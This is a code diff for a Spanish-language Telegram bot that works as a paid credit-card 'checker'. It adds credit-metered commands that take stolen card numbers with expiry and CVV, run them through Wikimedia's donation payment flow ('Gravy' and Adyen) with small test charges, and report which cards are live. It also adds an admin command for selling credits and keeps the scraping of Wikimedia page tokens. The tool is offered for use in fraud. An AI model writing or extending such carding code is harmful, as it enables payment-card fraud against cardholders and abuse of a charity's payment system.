@@ -3,7 +3,6 @@ import json
 import random
 import re
 import os
-import threading
 from datetime import datetime
 from flask import Flask, request
 from aiogram import Bot, Dispatcher, types
@@ -33,7 +32,7 @@ def save_users(users):
     with open(DB_FILE, "w", encoding="utf-8") as f:
         json.dump(users, f, indent=4)
 
-# ================= CHECKER =================
+# ================= CHECKER (Charge) =================
 def check_card(cc, mes, ano, cvv):
     try:
         s = requests.Session()
@@ -44,10 +43,9 @@ def check_card(cc, mes, ano, cvv):
 
         wmf_token = ""
         for line in html.splitlines():
-            if 'name="wmf_token"' in line and 'value=' in line:
-                if 'value="' in line:
-                    wmf_token = line.split('value="')[1].split('"')[0]
-                    break
+            if 'name="wmf_token"' in line and 'value="' in line:
+                wmf_token = line.split('value="')[1].split('"')[0]
+                break
 
         m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
         gravy_session = m.group(1) if m else None
@@ -110,11 +108,113 @@ async def gen(msg: types.Message):
     sent = await msg.answer(text)
     await bot.send_message(msg.chat.id, "Responde con `.a` (una) o `.n` (todas)", reply_to_message_id=sent.message_id)
 
-# Agrega aquí los demás comandos (.s .m .a .n .info .add) si quieres
+@dp.message(F.text.startswith(".info"))
+async def info(msg: types.Message):
+    uid = str(msg.from_user.id)
+    users = load_users()
+    u = users.get(uid, {"credits": 0.0})
+    await msg.answer(f"""
+亏 - Stats
+━━━━━━━━━
+火 ID: {msg.from_user.id}
+火 Name: {msg.from_user.first_name}
+火 Username: @{msg.from_user.username or 'No'}
+━━━━━━━━━
+干 Credits: {u['credits']:.2f}
+━━━━━━━━━
+    """)
+
+@dp.message(F.text.startswith(".add"))
+async def add_credits(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID:
+        return await msg.answer("❌ No autorizado.")
+    try:
+        _, target, cant = msg.text.split()
+        users = load_users()
+        uid = str(target)
+        if uid not in users:
+            users[uid] = {"credits": 0.0, "banned": False}
+        users[uid]["credits"] += float(cant)
+        save_users(users)
+        await msg.answer(f"""
+✅ Créditos Añadidos
+━━━━━━━━━
+👤 Usuario: {target}
+💰 Créditos añadidos: {cant}
+🔹 Nuevos créditos: {users[uid]['credits']}
+━━━━━━━━━
+        """)
+    except:
+        await msg.answer("Uso: `.add ID CANTIDAD`")
+
+# .s Single Auth
+@dp.message(F.text.startswith(".s "))
+async def single_auth(msg: types.Message):
+    uid = str(msg.from_user.id)
+    users = load_users()
+    u = users.get(uid, {"credits": 0.0})
+    if u["credits"] < 0.7:
+        return await msg.answer("❌ Créditos insuficientes.")
+    try:
+        cc_data = msg.text.split()[1]
+        cc, mes, ano, cvv = cc_data.split("|")
+        if len(ano) == 2: ano = "20" + ano
+        status = check_card(cc, mes, ano, cvv)
+        await msg.answer(f"""
+水口 - Time: 2.8's 😺 水
+━━Card Information━━
+• Card: {cc}|{mes}|{ano}|{cvv}
+• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
+• Gateway: Wikimedia Gravy
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+• BIN : {cc[:6]} - ES 🇪🇸
+By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
+        """)
+        # Actualizar créditos (menos si LIVE)
+        if status == "LIVE":
+            u["credits"] -= 1.2
+        else:
+            u["credits"] -= 0.7
+        users[uid] = u
+        save_users(users)
+    except:
+        await msg.answer("Formato inválido: CC|MM|AA|CVV")
+
+# .a Single Charge
+@dp.message(F.text.startswith(".a "))
+async def single_charge(msg: types.Message):
+    uid = str(msg.from_user.id)
+    users = load_users()
+    u = users.get(uid, {"credits": 0.0})
+    if u["credits"] < 1.2:
+        return await msg.answer("❌ Créditos insuficientes.")
+    # mismo código que .s pero con charge_mode=True si quieres diferenciar
+    try:
+        cc_data = msg.text.split()[1]
+        cc, mes, ano, cvv = cc_data.split("|")
+        if len(ano) == 2: ano = "20" + ano
+        status = check_card(cc, mes, ano, cvv)
+        await msg.answer(f"""
+水口 - Time: 4.2's 😺 水
+━━Card Information━━
+• Card: {cc}|{mes}|{ano}|{cvv}
+• Status: {"Success ✅" if status == "LIVE" else "Sorry Dead ❌"}
+• Gateway: Adyen CCN NR
+• Charge: $0.99
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+By: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {u['credits']:.2f}
+        """)
+        u["credits"] -= 1.5 if status == "LIVE" else 1.2
+        users[uid] = u
+        save_users(users)
+    except:
+        await msg.answer("Formato inválido")
+
+# .m .n .bin etc. se pueden añadir igual
 
 @app.route('/')
 def home():
-    return "Bot corriendo 24/7 🔥"
+    return "Bot Wikimedia Gravy - EDEN-XANDER corriendo 24/7 🔥"
 
 @app.route('/webhook', methods=['POST'])
 async def webhook():
@@ -125,13 +225,14 @@ async def webhook():
         pass
     return "OK", 200
 
-def run_bot():
-    print("Bot iniciado en Render 24/7")
-    asyncio.run(dp.start_polling(bot))
+async def main_bot():
+    print(Fore.GREEN + "Bot iniciado en Render 24/7 - EDEN-XANDER")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    thread = threading.Thread(target=run_bot, daemon=True)
-    thread.start()
-    
     port = int(os.getenv("PORT", 5000))
+    print(f"Flask corriendo en puerto {port}")
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.create_task(main_bot())
     app.run(host="0.0.0.0", port=port)
